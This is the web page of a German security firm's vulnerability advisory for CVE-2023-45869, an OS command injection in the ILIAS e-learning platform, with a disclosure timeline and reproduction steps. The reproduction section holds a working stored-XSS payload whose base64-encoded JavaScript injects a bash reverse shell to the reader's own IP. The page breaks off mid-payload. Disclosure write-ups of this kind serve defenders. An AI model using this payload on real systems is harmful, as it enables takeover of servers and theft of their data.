<!DOCTYPE html><html lang="de" class="dark">
<!--
################################################
###   ╦═╗╔═╗╦ ╦╔╦╗╔═╗ ╦╔╗╔╔═╗╔═╗╔═╗╔═╗╔═╗    ###
###   ╠╦╝║╣ ╠═╣║║║║╣  ║║║║╠╣ ║ ║╚═╗║╣ ║      ###
###   ╩╚═╚═╝╩ ╩╩ ╩╚═╝o╩╝╚╝╚  ╚═╝╚═╝╚═╝╚═╝    ###
###     Developed with ♥ by Reme Rehme       ###
################################################
We like secure software! Visit and support https://neos.io, the content application platform that forms the basis for this web application.
-->
<head><meta charset="UTF-8" /><meta http-equiv="x-ua-compatible" content="ie=edge" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" /><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" /><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" /><link rel="manifest" href="/site.webmanifest" /><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#000000" /><meta name="msapplication-TileColor" content="#000000" /><meta name="theme-color" content="#ffffff" /><link rel="stylesheet" href="https://rehmeinfosec.de/_Resources/Static/Packages/Rehme.Site/Styles/App.css?v=52b078d372c114060210fdbd89b522c0" media="all" /><script defer src="https://rehmeinfosec.de/_Resources/Static/Packages/Rehme.Site/JavaScript/Vendors.js?v=d514d06ebb28de87fd49e0ffdc29de13"></script><script defer src="https://rehmeinfosec.de/_Resources/Static/Packages/Rehme.Site/JavaScript/App.js?v=66dd8030bb67299a858d12ef104f25f8"></script><title>OS Command Injection in ILIAS eLearning platform - Labor - rehme.infosec</title><meta name="keywords" content="Code Review, Hacking, Konfigurationsaudit, Konfigurationsprüfung, OWASP, Penetration, Penetrationstest, Pentest, Quellcode-Analyse, Red Team, Schwachstellenprüfung, Schwachstellenscan, Security Test, Sicherheitsprüfung, Sicherheitstest" /><meta name="robots" content="index,follow" /><link rel="canonical" href="https://rehmeinfosec.de/labor/cve-2023-45869" /><link rel="alternate" hreflang="x-default" href="https://rehmeinfosec.de/labor/cve-2023-45869" /><link rel="alternate" hreflang="de" href="https://rehmeinfosec.de/labor/cve-2023-45869" /><meta name="twitter:card" content="summary" /><meta name="twitter:title" content="OS Command Injection in ILIAS eLearning platform" /><meta name="twitter:url" content="https://rehmeinfosec.de/labor/cve-2023-45869" /><meta property="og:type" content="article" /><meta property="og:title" content="OS Command Injection in ILIAS eLearning platform" /><meta property="og:site_name" content="rehme.infosec | Penetrationtests, Code Audit, Stuttgart" /><meta property="og:locale" content="de" /><meta property="og:url" content="https://rehmeinfosec.de/labor/cve-2023-45869" /><script type="application/ld+json">{"@context":"http:\/\/schema.org\/","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"rehme.infosec","item":"https:\/\/rehmeinfosec.de\/"},{"@type":"ListItem","position":2,"name":"Labor","item":"https:\/\/rehmeinfosec.de\/labor"},{"@type":"ListItem","position":3,"name":"OS Command Injection in ILIAS eLearning platform","item":"https:\/\/rehmeinfosec.de\/labor\/cve-2023-45869"}]}</script></head><body><span class="fixed -top-[100px] -right-[650px] w-[1400px] h-[600px] skew-y-12 rotate-45 opacity-50 -z-20 from-[#c3cace] dark:from-[#1b334f] from-0% via-[#c3cace] dark:via-[#1b2545] via-25% to-transparent to-70% bg-radient-ellipse-c"></span><header class="fixed w-screen drop-shadow-xl bg-white dark:bg-gray-900 py-4 z-30"><div class="absolute w-full pointer-events-none bottom-[60px] h-[380px] -z-10 pointer-events-none headerbg-normal headerbg-gradient dark:headerbg-gradient" style="transform: skewY(-8deg);"><span class="absolute left-0 w-2/5 h-[380px] top-[-9px] bg-customgradient-90 from-gradientoned to-gradienttwod dark:from-gradientone dark:to-gradienttwo"></span><span class="absolute right-0 w-6/12 top-[393px] h-[112px] bg-customgradient-90 from-gradienttwod to-gradientthreed dark:from-gradienttwo dark:to-gradientthree"></span><span class="absolute right-0 w-7/12 top-[407px] h-[115px] bg-customgradient-90 from-gradienttwod to-gradientthreed dark:from-gradienttwo dark:to-gradientthree"></span></div><div class="mx-auto max-w-screen-xl px-4 sm:px-6 lg:px-8"><div class="flex h-16 items-center justify-between"><div class="flex items-center md:gap-12"><a aria-label="rehme.infosec" class="inline-flex items-center text-gray-800 dark:text-sky-100" href="/"><span class="sr-only">Home</span><svg xmlns="http://www.w3.org/2000/svg" class="h-14 md:h-16 rotate-45" viewBox="0 0 87.5 115.5" fill="none"><g id="logo-svg" data-name="logo-svg"><g id="logo-left"><path fill="currentColor" d="M72.5,44.5,83,31,58,0H46l.5,83.5h11v-21l7-8,14,19,9-10Zm-15-2v-23l10,12Z" /></g><g id="logo-right"><path fill="currentColor" d="M15,71,4.5,84.5l25,31h12L41,32H30V53l-7,8L9,42,0,52Zm15,2V96L20,84Z" /></g></g></svg><span class="hidden sm:block pl-6 text-lg text-gray-800 dark:text-white">rehme.infosec</span><a href="/schnelleinstieg" class="block text-xs" aria-label="Was, Wie, Warum?"><div class="text-xs leading-5 font-medium text-sky-600 dark:text-sky-400 bg-sky-400/10 rounded-full py-1 px-3 hidden lg:flex items-center hover:bg-sky-400/20"><strong class="font-semibold">Was, Wie, Warum?</strong><svg width="2" height="2" fill="currentColor" aria-hidden="true" class="ml-2 text-sky-600 dark:text-sky-400/70"><circle cx="1" cy="1" r="1"></circle></svg><span class="ml-2">Schnelleinstieg</span><svg width="3" height="6" class="ml-3 overflow-visible text-sky-300 dark:text-sky-400" aria-hidden="true"><path d="M0 0L3 3L0 6" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></div></a></a></div><div class="flex items-center justify-end"><nav id="main-nav" aria-label="Global" class="hidden md:block"><ul id="main-nav-inner" class="flex items-center gap-7 text-sm lg:text-base"><li><a aria-label="Services" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/leistungen">Services</a><div class="1"><ul class="hide"><li><a aria-label="Penetrationstests &amp; Red-Teaming" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/leistungen/penetrationstests-red-teaming">Penetrationstests & Red-Teaming</a></li><li><a aria-label="Code Audits" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/leistungen/code-audits">Code Audits</a></li></ul></div></li><li><a aria-label="Unternehmen" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/unternehmen">Unternehmen</a></li><li><a aria-label="Labor" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor">Labor</a><div class="1"><ul class="hide"><li><a aria-label="OS Command Injection in ILIAS eLearning platform" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/os-command-injection-in-ilias-elearning-platform">OS Command Injection in ILIAS eLearning platform</a></li><li><a aria-label="Mehrere Remote Code Execution Sicherheitslücken in &quot;Fragenpool für Tests&quot; Import" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/mehrere-remote-code-execution-sicherheitsluecken-in-fragenpool-fuer-tests-import">Mehrere Remote Code Execution Sicherheitslücken in "Fragenpool für Tests" Import</a></li><li><a aria-label="Remote Code Execution in &quot;Fragenpool für Umfragen&quot; Import" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/remote-code-execution-in-fragenpool-fuer-umfragen-import">Remote Code Execution in "Fragenpool für Umfragen" Import</a></li><li><a aria-label="Multiple Cross Site Scipting (XSS) in ILIAS eLearning platform" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/multiple-cross-site-scipting-xss-in-ilias-elearning-platform">Multiple Cross Site Scipting (XSS) in ILIAS eLearning platform</a></li><li><a aria-label="Local File Inclusion in ILIAS eLearning platform" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/local-file-inclusion-in-ilias-elearning-platform">Local File Inclusion in ILIAS eLearning platform</a></li><li><a aria-label="Remote Code Execution und .htaccess Bypass in ILIAS eLearning platform" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/remote-code-execution-and-bypassing-htaccess-rule-in-ilias-elearning-platform">Remote Code Execution und .htaccess Bypass in ILIAS eLearning platform</a></li><li><a aria-label="Arbitrary File Deletion in ILIAS eLearning platform" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/arbitrary-file-deletion-in-ilias-elearning-platform">Arbitrary File Deletion in ILIAS eLearning platform</a></li><li><a aria-label="Remote Code Execution in Stud.IP (eLearning platform)" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/cve-2023-50982">Remote Code Execution in Stud.IP (eLearning platform)</a></li><li><a aria-label="OS Command Injection in ILIAS eLearning platform" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/cve-2023-45869">OS Command Injection in ILIAS eLearning platform</a></li><li><a aria-label="Local File Inclusion to Arbitrary File Copy in ILIAS eLearning platform" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/cve-2023-45868">Local File Inclusion to Arbitrary File Copy in ILIAS eLearning platform</a></li><li><a aria-label="XSS in Roundcube Webmailer" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/cve-2023-47272">XSS in Roundcube Webmailer</a></li><li><a aria-label="Local File Inclusion in ILIAS eLearning platform" class="text-gray-800 transition hover:text-gray-800/75 dark:text-white dark:hover:text-sky-400" href="/labor/cve-2023-45867">Local File Inclusion in ILIAS eLearning platform</a></li></ul></div></li></ul></nav><div class="flex items-center border-l border-r border-slate-200 ml-6 pl-4 mr-6 pr-4 dark:border-slate-800"><button type="button" id="toggleMode" aria-label="toggle navigation" aria-haspopup="true" aria-expanded="true"><span class="dark:hidden"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6"><path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" class="fill-sky-400/20 stroke-sky-500"></path><path d="M12 4v1M17.66 6.344l-.828.828M20.005 12.004h-1M17.66 17.664l-.828-.828M12 20.01V19M6.34 17.664l.835-.836M3.995 12.004h1.01M6 6l.835.836" class="stroke-sky-500"></path></svg></span><span class="hidden dark:inline"><svg viewBox="0 0 24 24" fill="none" class="w-6 h-6"><path fill-rule="evenodd" clip-rule="evenodd" d="M17.715 15.15A6.5 6.5 0 0 1 9 6.035C6.106 6.922 4 9.645 4 12.867c0 3.94 3.153 7.136 7.042 7.136 3.101 0 5.734-2.032 6.673-4.853Z" class="fill-sky-500"></path><path d="m17.715 15.15.95.316a1 1 0 0 0-1.445-1.185l.495.869ZM9 6.035l.846.534a1 1 0 0 0-1.14-1.49L9 6.035Zm8.221 8.246a5.47 5.47 0 0 1-2.72.718v2a7.47 7.47 0 0 0 3.71-.98l-.99-1.738Zm-2.72.718A5.5 5.5 0 0 1 9 9.5H7a7.5 7.5 0 0 0 7.5 7.5v-2ZM9 9.5c0-1.079.31-2.082.845-2.93L8.153 5.5A7.47 7.47 0 0 0 7 9.5h2Zm-4 3.368C5 10.089 6.815 7.75 9.292 6.99L8.706 5.08C5.397 6.094 3 9.201 3 12.867h2Zm6.042 6.136C7.718 19.003 5 16.268 5 12.867H3c0 4.48 3.588 8.136 8.042 8.136v-2Zm5.725-4.17c-.81 2.433-3.074 4.17-5.725 4.17v2c3.552 0 6.553-2.327 7.622-5.537l-1.897-.632Z" class="fill-sky-500"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M17 3a1 1 0 0 1 1 1 2 2 0 0 0 2 2 1 1 0 1 1 0 2 2 2 0 0 0-2 2 1 1 0 1 1-2 0 2 2 0 0 0-2-2 1 1 0 1 1 0-2 2 2 0 0 0 2-2 1 1 0 0 1 1-1Z" class="fill-sky-500"></path></svg></span></button></div><div class="flex items-center gap-4"><div class="md:flex md:gap-4"><a class="rounded-md bg-sky-600 px-5 py-2.5 text-sm lg:text-base font-medium text-white shadow dark:hover:bg-sky-500" href="/impressum" aria-label="Link">Kontakt</a></div><div class="block md:hidden"><button id="nav-trigger" class="rounded bg-gray-100 p-2 text-gray-600 transition hover:text-gray-600/75 dark:bg-gray-800 dark:text-white dark:hover:text-white/75" aria-label="toggle navigation"><svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" /></svg></button></div></div></div></div></div></header><section class="mx-auto max-w-screen-xl pt-24 px-4 sm:px-6 lg:px-8"><div class="neos-contentcollection"><div class="flexgrid-row"><div class="flexgrid-col-xs-12 flexgrid-col-sm-4 flexgrid-col-md-3 flexgrid-col-lg-3 flexgrid-last-xs flexgrid-first-sm flexgrid-first-md flexgrid-first-lg"><div class="sticky top-[96px]"><div class="infosec-headline distanceTop60 distanceBottom30"><h2 class="text-black dark:text-white text-2xl font-semibold">Weitere Veröffentlichungen</h2></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>In unserem Labor schreiben wir regelmäßig in Form von Blogbeiträgen über identifizierte Sicherheitslücken, welche nach dem <a href="/responsible-disclosure"><span class="text-sky-600 dark:text-sky-400">Responsible Disclosure</span></a> Verfahren veröffentlicht werden.</p></div><div class="infosec-button  distanceBottom30"><a aria-label="Zum Labor" class="group inline-flex items-center rounded-full bg-sky-600 px-5 py-2.5 text-sm lg:text-base font-medium text-white dark:hover:bg-sky-500 dark:shadow" href="/labor"><div>Zum Labor</div><svg class="transition-all ml-3 w-2 h-2.5 text-white group-hover:transition-all group-hover:h-3" viewBox="0 0 3 6" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1"><path d="M0 0L3 3L0 6"></path></svg></a></div></div></div><div class="flexgrid-col-xs-12 flexgrid-col-sm-8 flexgrid-col-md-9 flexgrid-col-lg-9 flexgrid-first-xs flexgrid-last-sm flexgrid-last-md flexgrid-last-lg"><div class="infosec-headline distanceTop30"><h4 class="text-sky-400 text-lg font-semibold">Veröffentlichung (CVE-2023-45869)</h4></div><div class="infosec-headline  distanceBottom15"><h1 class="text-black dark:text-white text-3xl font-semibold">OS Command Injection in ILIAS eLearning platform</h1></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">27.10.2023 - Rene Rehme</span></p></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>Im Zuge eines Penetrationstests haben wir mehrere Sicherheitslücken in <span class="text-amber-600 dark:text-amber-400"><strong>ILIAS Version 7.25 (2023-09-12 Release)</strong></span> identifiziert. Neben Cross Site Scripting (<a target="_blank" rel="noopener external" href="https://owasp.org/www-community/attacks/xss/"><span class="text-red-600 dark:text-red-400">XSS</span></a>) konnte eine sogenannte <a target="_blank" rel="noopener external" href="https://owasp.org/www-community/attacks/Command_Injection" title="https://owasp.org/www-community/attacks/Command_Injection"><span class="text-red-600 dark:text-red-400">OS Command Injection</span></a> bewerkstelligt werden. Dies ist eine Sicherheitslücke, bei der von einem Angreifer übermittelte Befehle auf Betriebssystem-Ebene ausgeführt werden können. In diesem Fall ist es möglich Kommandozeilen-Befehle durch Kombination von <a href="/labor">gefundenen Sicherheitslücken</a> auszuführen.</p></div><div class="infosec-headline  distanceBottom15"><h4 class="text-sky-400 text-lg font-semibold">Responsible Disclosure</h4></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><span class="text-amber-600 dark:text-amber-400">⚑</span> 25. Sep. 2023 - Die Sicherheitslücke wurde identifiziert.<br><span class="text-amber-600 dark:text-amber-400">→</span> 26. Sep. 2023 - Die Sicherheitslücke wurde an ILIAS gemeldet.<br><span class="text-amber-600 dark:text-amber-400">←</span> 29. Sep. 2023 - ILIAS bestätigt den Erhalt des Reports.<br><span class="text-amber-600 dark:text-amber-400">←</span> 06. Okt. 2023 - ILIAS bestätigt, dass die Sicherheitslücke geschlossen wurde.<br><span class="text-amber-600 dark:text-amber-400">←</span> 23. Okt. 2023 - Patched ILIAS-Release: <a rel="noopener external" href="https://docu.ilias.de/goto_docu_pg_154840_35.html" target="_blank" title="">8.6</a>, <a rel="noopener external" href="https://docu.ilias.de/goto_docu_pg_154839_35.html" target="_blank" title="">7.26</a></p></div><div class="infosec-headline  distanceBottom15"><h2 class="text-black dark:text-white text-2xl font-semibold">Allgemeine Beschreibung</h2></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom15"><p>Ein Benutzer mit Administratorrechten kann in ILIAS Konfigurationen für den PDF-Renderer vornehmen. Die Komponente, welche diese Einstellungen verarbeitet ist vulnerabel, wodurch Angreifer die Möglichkeit haben, Systembefehle einzuschleusen.&nbsp;</p><p>&nbsp;</p><p>Ein Hinweis zu einer bereits bekannten Sicherheitslücke (<a target="_blank" rel="noopener external" href="https://nvd.nist.gov/vuln/detail/CVE-2022-45915" title="https://nvd.nist.gov/vuln/detail/CVE-2022-45915">CVE-2022-45915</a>) wurde bei der Schwachstellenmeldung angemerkt, da dieselbe Komponente betroffen ist. Der entscheidende Unterschied ist, dass für die Übermittlung einer Payload nicht der Pfad zur Binary <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">wkhtmltopdf</span> selbst, sondern Eingabefelder der Options-Parameter vulnerabel sind. Aufgrund von fehlender Eingabeüberprüfungen ist es potenziell möglich, die Befehlskette beliebig zu erweitern.</p><p>&nbsp;</p><p>Besonders kritisch macht diese Sicherheitslücke, dass sie unter Umständen als normaler User ausgenutzt werden kann. Unter "normal" verstehen wir einen User Account mit den voreingestellten Rechten einer aufgesetzten ILIAS Instanz.</p><p>&nbsp;</p><p>Der folgende PoC und die abschließende Klassifizierung bilden das Worst-Case-Szenario ab. Der Angriff erfolgt durch einen Account mit User-Rechten.</p></div><div class="infosec-headline  distanceBottom15"><h2 class="text-black dark:text-white text-2xl font-semibold">Proof of Concept (PoC)</h2></div><div class="infosec-video rounded-md overflow-hidden  distanceBottom30"><video controls src="https://rehmeinfosec.de/_Resources/Persistent/0/9/6/5/0965861ad7e0a68c9bdb4a53969d10d89a2c97bf/72f1b724391c43b2910d2b5a9de91a24.mp4" poster="https://rehmeinfosec.de/_Resources/Persistent/d/a/5/e/da5e8674cd5eccb8d1a3d8db221a6f48d4cdeece/Screenshot%20from%202024-02-05%2011-22-33.png" class="w-full h-full object-cover"></video></div><div class="infosec-headline  distanceBottom15"><h2 class="text-black dark:text-white text-2xl font-semibold">Reproduktion der Sicherheitslücke</h2></div><div class="infosec-headline  distanceBottom30"><h4 class="text-sky-400 text-lg font-semibold">Reproduktionsschritte (Worst-Case)</h4></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><span class="text-amber-600 dark:text-amber-400"><strong>Vorabhinweis:</strong></span></p><p>Die folgenden Reproduktionsschritte beschreiben eine Ausnutzung der Sicherheitslücke mit dem größtmöglichen Impact. Falls die Sicherheitslücle auf einfachem Wege (als Administrator) reproduziert werden soll, können folgend aufgeführten Schritte übersprungen und den Anweisungen unter dem Punkt <em>Reproduktionsschritte (als Admin)</em>" gefolgt werden.<br>&nbsp;</p><p><span class="text-amber-600 dark:text-amber-400"><strong>Schritt 1:</strong></span></p><p>Zunächst muss eine <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">ILIAS-Version7.25 2023-09-12</span> Instanz auf einem Testsystem installiert werden. Neben dem gegebenen Administrator, sollte ein weitere User Account angelegt werden:<br>&nbsp;</p><ul><li><span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">root</span> (ein Administrator)</li><li><span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">testuser</span> (ein normaler User, der Angreifer)</li></ul><p>&nbsp;</p><p><span class="text-amber-600 dark:text-amber-400"><strong>Schritt 2:</strong></span></p><p>Mit dem Administrator-Account muss unter <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Administration<sup>(1)</sup> &gt; Layout und Navigation<sup>(2)</sup> &gt; Editor<sup>(3)</sup> &gt; HTML/Javascript erlauben</span> die Checkbox bei <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Modules/Portfolio: Portfolioseite<sup>(4)</sup></span> aktiviert werden.</p></div><div class="infosec-image  distanceBottom30"><img src="https://rehmeinfosec.de/_Resources/Persistent/5/1/3/b/513bdab90934ad48d6fecd40842fb1145c1845b2/ade5510799e84f87a048fbf629026949-1606x1442.webp" srcset="https://rehmeinfosec.de/_Resources/Persistent/6/1/8/b/618b5de34923812c547e7b46b646623fec646576/ade5510799e84f87a048fbf629026949-320x287.webp 320w, https://rehmeinfosec.de/_Resources/Persistent/8/5/b/0/85b00ed5e76cee1a6bd6c552aca7b1b217cf0804/ade5510799e84f87a048fbf629026949-400x359.webp 400w, https://rehmeinfosec.de/_Resources/Persistent/4/3/0/5/43058ee7dd51b79d84b7798392854bc2269a3996/ade5510799e84f87a048fbf629026949-600x539.webp 600w, https://rehmeinfosec.de/_Resources/Persistent/3/3/1/d/331d26fc42e991648b0221913a2016088c083b6f/ade5510799e84f87a048fbf629026949-800x718.webp 800w, https://rehmeinfosec.de/_Resources/Persistent/9/5/1/6/9516fb74a1435007890f72018b751cd936ceb281/ade5510799e84f87a048fbf629026949-1000x898.webp 1000w, https://rehmeinfosec.de/_Resources/Persistent/c/8/7/4/c87419e70dcce80495314e2aeaec3317997ee582/ade5510799e84f87a048fbf629026949-1200x1077.webp 1200w, https://rehmeinfosec.de/_Resources/Persistent/0/b/4/8/0b487f182f1a6a8a755a258d0f7029b228c6b308/ade5510799e84f87a048fbf629026949-1600x1437.webp 1600w" sizes="(min-width: 800px) 1000px, (min-width: 480px) 800px, (min-width: 320px) 440px, 100vw" loading="lazy" alt="test" width="1606" height="1442" /></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom15"><p><span class="text-amber-600 dark:text-amber-400"><strong>Schritt 3:</strong></span></p><p>Ein Login mit dem <strong>User Account</strong> <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">testuser</span> muss stattfinden.<br><br>Navigieren Sie auf <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Persönlicher Arbeitsraum &gt; Portfolio</span> und erstellen Sie ein Portfolio mit einer leeren Seite. Bearbeiten Sie die leere Seite und erstellen Sie das Inhaltselement <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Text einfügen</span>.</p><p><br>Kopieren Sie die folgende Payload in einen Texteditor Ihrer Wahl. Ersetzen Sie die im Data-Attribut ( <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">data-ip</span>) gegebene IP <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">123.456.78.910</span> mit <strong>Ihrer öffentlichen IP</strong> (also die IP-Adresse, welche für eine Verbindung zum Webserver verwendet werden soll – z.B. die Ihres PCs).</p></div><div class="infosec-sourcecode relative  distanceBottom15"><div class="absolute -top-[25px] right-0 z-10 px-2 text-xs rounded-tr-md bg-gradient-to-r from-transparent to-slate-200 dark:to-slate-700"><div class="flex items-center"><svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><path d="M4 12a7 7 0 0 1 7-7h2a7 7 0 1 1 0 14h-2a7 7 0 0 1-7-7Z" class="fill-gray-700"></path><path d="M10.25 9.75 7.75 12l2.5 2.25" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-sky-100"></path><path d="m13.75 9.75 2.5 2.25-2.5 2.25" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-sky-100"></path></svg><span class="ml-1 font-mono text-gray-700 dark:text-gray-400">payload</span></div></div><pre class="line-numbers relative block w-full" data-line style="word-break: break-all; white-space: break-spaces;"><code class="language-html">&lt;img data-ip="123.456.78.910" id="sUhDeWhSwd" src="x" onerror=""&gt;</code><div class="absolute top-0 right-0 w-32 h-full z-10 px-2 text-xs text-gray-300 opacity-50 font-mono rounded-br-md bg-gradient-to-r from-transparent to-slate-600 pointer-events-none"></div></pre></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom15"><p>Für das <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">onerror</span> attribute kann folgende XSS Payload als Value hinterlegt werden:</p></div><div class="infosec-sourcecode relative  distanceBottom15"><div class="absolute -top-[25px] right-0 z-10 px-2 text-xs rounded-tr-md bg-gradient-to-r from-transparent to-slate-200 dark:to-slate-700"><div class="flex items-center"><svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><path d="M4 12a7 7 0 0 1 7-7h2a7 7 0 1 1 0 14h-2a7 7 0 0 1-7-7Z" class="fill-gray-700"></path><path d="M10.25 9.75 7.75 12l2.5 2.25" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-sky-100"></path><path d="m13.75 9.75 2.5 2.25-2.5 2.25" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-sky-100"></path></svg><span class="ml-1 font-mono text-gray-700 dark:text-gray-400">payload</span></div></div><pre class="line-numbers relative block w-full" data-line style="word-break: break-all; white-space: break-spaces;"><code class="language-html">eval(atob('dmFyIHBpPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzVWhEZVdoU3dkIiksYWk9cGkuZGF0YXNldC5pcCxhcD1waS5kYXRhc2V0LnBvcnQscz0oZSx0LG8pPT5uZXcgUHJvbWlzZShhPT57dmFyIHM9bmV3IFhNTEh0dHBSZXF1ZXN0O3Mub3Blbih0LGUsITApLHMuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIikscy5yZXNwb25zZVR5cGU9InRleHQiLHMub25yZWFkeXN0YXRlY2hhbmdlPSgoKT0+ezQhPXMucmVhZHlTdGF0ZXx8MjAwIT1zLnN0YXR1cyYmMzAyIT1zLnN0YXR1c3x8YShzKX0pLHMuc2VuZChvKSxzZXRUaW1lb3V0KCgpPT57cy5hYm9ydCgpLGEoKX0sMWUzKX0pLGI9d2luZG93LmxvY2F0aW9uLnByb3RvY29sKyIvLyIrd2luZG93LmxvY2F0aW9uLmhvc3QsdD0oZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1tX3NlYXJjaF9mb3JtIikuZ2V0QXR0cmlidXRlKCJhY3Rpb24iKS5tYXRjaCgvcnRva2VuPShbXiZdKykvKXx8W10pWzFdO3MoYisiL2lsaWFzLnBocD9yZWZfaWQ9NjcmYWRtaW5fbW9kZT1zZXR0aW5ncyZjbWQ9cG9zdCZjbWRDbGFzcz1pbG9ianBkZmdlbmVyYXRpb25ndWkmY21kTm9kZT0xZDpveiZiYXNlQ2xhc3M9aWxBZG1pbmlzdHJhdGlvbkdVSSZmYWxsYmFja0NtZD12aWV3JnJ0b2tlbj0iK3QsIlBPU1QiLCJwYXRoPSUyRnVzciUyRmJpbiUyRndraHRtbHRvcGRmJmV4dGVybmFsX2xpbmtzPTEmamF2YXNjcmlwdF9kZWxheT0yMDArJTIyMTI3LjAuMC4xJTIyKyUyRnRtcCUyRngucGRmKyUyNiUyNitybSslMkZ0bXAlMkZ4LnBkZislMjYlMjYrJTJGYmluJTJGYmFzaCstYyslMjdiYXNoKy1pKyUzRSUyRmRldiUyRnRjcCUyRiIrYWkrIiUyRiIrYXArIiswJTNFJTI2MSUyNyslMjMmc2VydmljZT1Qb3J0Zm9saW8mcHVycG9zZT1Db250ZW50RXhwb3J0JnJlbmRlcmVyPVdraHRtbFRvUGRmJmNtZCU1QnNhdmVDb25maWclNUQ9U3BlaWNoZXJuIikudGhlbigoKT0+e2NvbnNvbGUubG9nKCJbK10gUGF5bG9hZCBhZGRlZCB0byB2dWxuZXJhYmxlIG1vZHVsZS4iKSxzKGIrIi9pbGlhcy5waHA/bmV3X3R5cGU9cHJ0ZiZjbWQ9cG9zdCZjbWRDbGFzcz1pbG9ianBvcnRmb2xpb2d1aSZjbWROb2RlPTk5OnZmOnA3JmJhc2VDbGFzcz1pbERhc2hib2FyZEdVSSZydG9rZW49MjljOTFmZjg4MDJkYTdhNWQ1MTQ2MzFkOTkwOWU2NzUiLCJQT1NUIiwidGl0bGU9eCZtb2RlPW1vZGVfc2NyYXRjaCZwdHlwZT1wYWdlJmZwYWdlPXgmY21kJTVCc2F2ZSU1RD1FcnN0ZWxsZW4iKS50aGVuKGU9Pntjb25zb2xlLmxvZygiWytdIFBvcnRmb2xpbyBjcmVhdGVkLiIpO3ZhciBvPShlLnJlc3BvbnNlVVJMLm1hdGNoKC9bPyZdcHJ0X2lkPShbXiZdKykvKXx8W10pWzFdO3MoYisiL2lsaWFzLnBocD9wcnRfaWQ9IitvKyImY21kPXBvc3QmY21kQ2xhc3M9aWxvYmpwb3J0Zm9saW9ndWkmY21kTm9kZT05OTp2Zjp